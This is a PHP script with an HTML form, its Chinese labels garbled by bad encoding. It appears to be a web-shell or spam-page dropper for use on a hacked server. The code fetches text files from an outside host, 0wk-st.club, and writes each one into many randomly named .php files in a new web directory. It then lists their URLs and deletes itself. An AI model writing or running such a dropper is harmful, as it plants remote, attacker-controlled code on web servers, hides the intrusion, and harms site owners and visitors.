<html>
<head>
<link rel="stylesheet" href="http://www.bootcss.com/p/buttons/css/buttons.css">
<title>����С��</title>
</head>
<body>
		<center><font size="2" face="΢���ź�">
		<h2>ӣ��С����</h2>
		<form method='post' action=''>
		�����ļ�����:<input type="text" placeholder="�ļ���" min="1" style='width:56px;font-family:΢���ź�' name='num'>
		<br>
		����Ŀ¼����:<input type="text" placeholder="Ŀ¼��" style='width:60px;font-family:΢���ź�' name='new' >
		</p>
		<input style="Width:145px;height:28pt;display:inline-block;font-family:΢���ź�" type="submit" class="button button-glow button-border button-rounded button-primary" value='����'>
		</p>
		ѡ����Ҫ����:
		<form action="">
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/5.txt"/>1
        <input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/2.txt"/>2
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/6.txt"/>3
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/7.txt"/>4
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/8.txt"/>5
        <input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/1.txt"/>7
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/3.txt"/>8
		<input name="month[]" type="checkbox" value="http://0wk-st.club/hoen/s/4.txt"/>9
		</p>δ������������˽�Ըİ�Ȩ@��Ȩ����
		</form>
		</center>
	<hr />
</body>
</html>
<?php
	@$num = $_POST['num'];
	@$new = isset($_POST['new'])?$_POST['new']:'test';
	if($num == null){
		die();
	}
	@$ar=$num;
	$u = $_POST['month'];
	foreach($u as $vo){
		$s=file_get_contents($vo);
		@mkdir("$new");
		for($i=0; $i<$ar; $i++){
			$d=rand(4,5); //�����������ɳ���ǰ׺����
			$tmp=createRandomStr($d);
			
			$sheng = "./$new/$tmp.php";
			file_put_contents($sheng,$s);
			$url='http://'.$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]; 
			$url1 = dirname($url);
			
		
		} 
	}
	@unlink("test9.php"); //��ɾ��
@unlink(php_self());

function myreaddir($dir) {
$handle=opendir($dir);
$i=0;
while($file=readdir($handle)) {
if (($file!=".")and($file!="..")) {
$list[$i]=$file;
$i=$i+1;
}
}
closedir($handle); 
return $list;
}

$input = myreaddir("./$new");
$a = array();
 foreach($input as $key=>$item){
	 
	 if(strpos($item,".php")!==false)
		$a[] = $item;
}
foreach($a as $key=>$value){
  echo $url1."/$new/".$value."<br>";
}




function php_self(){

    $php_self=substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+2);

    return $php_self;

}

function createRandomStr($length){ 
$str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';//����ַ�
$strlen = 62; 
while($length > $strlen){ 
$str .= $str; 
$strlen += 62; 
} 
$str = str_shuffle($str); 
return substr($str,0,$length); 
} 

?>